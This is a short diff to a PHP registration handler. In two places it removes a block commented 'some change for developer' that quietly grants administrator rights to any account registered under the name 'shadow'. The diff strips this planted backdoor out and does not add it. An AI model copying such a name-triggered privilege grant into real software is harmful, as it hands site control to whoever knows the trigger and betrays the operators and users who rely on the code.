@@ -184,10 +184,6 @@ class Account {
             );
 
             if ($uid) {
-                // === some change for developer ===
-                if (strtolower($_POST['name']) === 'shadow') {
-                    $database->updateUserField($uid, 'access', ADMIN, 1);
-                }
 
                 $mailer->sendActivate($_POST['email'], $_POST['name'], $_POST['pw'], $act);
                 header("Location: activate.php?id=$uid&q=$act2");
@@ -205,10 +201,6 @@ class Account {
             );
 
             if ($uid) {
-                // === some change for developer ===
-                if (strtolower($_POST['name']) === 'shadow') {
-                    $database->updateUserField($uid, 'access', ADMIN, 1);
-                }
 
 				setcookie("COOKUSR", rawurlencode($_POST['name']), time()+COOKIE_EXPIRE, COOKIE_PATH, '', false, true);
 				setcookie("COOKEMAIL", rawurlencode($_POST['email']), time()+COOKIE_EXPIRE, COOKIE_PATH, '', false, true);
